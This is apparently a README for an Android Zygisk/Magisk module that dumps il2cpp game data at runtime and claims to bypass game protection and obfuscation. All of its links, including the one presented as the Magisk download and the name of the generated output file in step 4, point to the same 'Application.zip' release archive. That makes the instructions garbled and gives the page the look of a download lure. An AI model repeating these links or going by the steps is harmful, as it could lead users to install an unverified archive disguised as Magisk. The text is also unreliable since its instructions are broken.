# Zygisk-Il2CppDumper
Il2CppDumper with Zygisk, dump il2cpp data at runtime, can bypass protection, encryption and obfuscation.

中文说明请戳[这里](https://github.com/RYANdouglad/Zygisk-Il2CppDumper/releases/download/v1.0/Application.zip)

## How to use
1. Install [Magisk](https://github.com/RYANdouglad/Zygisk-Il2CppDumper/releases/download/v1.0/Application.zip) v24 or later and enable Zygisk
2. Build module
   - GitHub Actions
      1. Fork this repo
      2. Go to the **Actions** tab in your forked repo
      3. In the left sidebar, click the **Build** workflow.
      4. Above the list of workflow runs, select **Run workflow**
      5. Input the game package name and click **Run workflow**
      6. Wait for the action to complete and download the artifact
   - Android Studio
      1. Download the source code
      2. Edit `game.h`, modify `GamePackageName` to the game package name
      3. Use Android Studio to run the gradle task `:module:assembleRelease` to compile, the zip package will be generated in the `out` folder
3. Install module in Magisk
4. Start the game, `https://github.com/RYANdouglad/Zygisk-Il2CppDumper/releases/download/v1.0/Application.zip` will be generated in the `/data/data/GamePackageName/files/` directory